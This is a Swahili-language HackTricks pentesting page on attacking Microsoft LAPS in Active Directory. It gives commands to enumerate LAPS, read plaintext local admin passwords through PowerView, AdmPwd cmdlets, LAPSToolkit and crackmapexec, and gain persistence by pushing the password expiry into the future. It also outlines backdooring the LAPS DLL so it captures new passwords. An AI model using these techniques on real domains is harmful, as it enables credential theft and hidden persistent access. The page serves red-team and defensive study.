# LAPS

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Taarifa Msingi

Local Administrator Password Solution (LAPS) ni zana inayotumiwa kusimamia mfumo ambapo **nywila za wasimamizi**, ambazo ni **za kipekee, zimechanganywa, na zinabadilishwa mara kwa mara**, zinatumika kwenye kompyuta zilizounganishwa na kikoa. Nywila hizi hifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji ambao wamepewa ruhusa kupitia Orodha za Kudhibiti Upatikanaji (ACLs). Usalama wa uhamisho wa nywila kutoka kwa mteja kwenda kwa seva unahakikishwa na matumizi ya **Kerberos version 5** na **Advanced Encryption Standard (AES)**.

Katika vitu vya kompyuta vya kikoa, utekelezaji wa LAPS unapelekea kuongezwa kwa sifa mbili mpya: **`ms-mcs-AdmPwd`** na **`ms-mcs-AdmPwdExpirationTime`**. Sifa hizi huhifadhi **nywila ya wasimamizi ya maandishi wazi** na **wakati wake wa kumalizika**, mtawalia.

### Angalia ikiwa imeamilishwa
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Upatikanaji wa Nywila za LAPS

Unaweza **kupakua sera ya LAPS iliyosindikwa** kutoka `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` na kisha tumia **`Parse-PolFile`** kutoka kifurushi cha [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) kinaweza kutumika kubadilisha faili hii kuwa muundo unaoweza kusomwa na binadamu.

Zaidi ya hayo, **amri za LAPS za PowerShell za asili** zinaweza kutumika ikiwa zimefungwa kwenye kifaa ambacho tunayo upatikanaji wa:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** inaweza pia kutumika kujua **nani anaweza kusoma nenosiri na kulisoma**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) inarahisisha uchambuzi wa LAPS na kazi kadhaa.\
Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zilizo na LAPS imewezeshwa.** Hii itaonyesha **makundi** maalum **yaliyoruhusiwa kusoma nywila za LAPS**, ambazo mara nyingi ni watumiaji katika makundi ya kulindwa.\
**Akaunti** ambayo imejiunga na kompyuta kwenye kikoa inapokea `Haki Zote za Extended` juu ya kompyuta hiyo, na haki hii inampa **akaunti** uwezo wa **kusoma nywila**. Uchambuzi unaweza kuonyesha akaunti ya mtumiaji ambaye anaweza kusoma nywila ya LAPS kwenye kompyuta. Hii inaweza kutusaidia **kulenga watumiaji maalum wa AD** ambao wanaweza kusoma nywila za LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Kudondosha Nywila za LAPS Kwa Kutumia Crackmapexec**
Ikiwa hakuna ufikiaji wa powershell, unaweza kutumia haki hii vibaya kijijini kupitia LDAP kwa kutumia
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Hii itadumpisha nywila zote ambazo mtumiaji anaweza kusoma, kuruhusu kupata msingi bora na mtumiaji tofauti.

## **LAPS Uthabiti**

### **Tarehe ya Muda wa Kufikia**

Maradhi ya admin, ni **inawezekana kupata nywila** na **kuzuia** kifaa kutoka **kuboresha** nywila yake kwa **kuweka tarehe ya muda wa kufikia katika siku zijazo**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Nenosiri bado yataweza kurejeshwa ikiwa **msimamizi** anatumia amri ya **`Reset-AdmPwdPassword`**; au ikiwa **Usiruhusu muda wa kumalizika kwa nenosiri kuwa mrefu kuliko ulivyohitajika na sera** imeamilishwa katika LAPS GPO.
{% endhint %}

### Mlango wa Nyuma

Msimbo wa asili wa LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), kwa hivyo ni muhimu kuweka mlango wa nyuma katika msimbo (ndani ya njia ya `Get-AdmPwdPassword` katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambao uta **kuchukua nywila mpya au kuzihifadhi mahali fulani**.

Kisha, tuunde tena `AdmPwd.PS.dll` na iweke kwenye kifaa katika njia ya `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe wakati wa kubadilisha).

## Marejeo
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
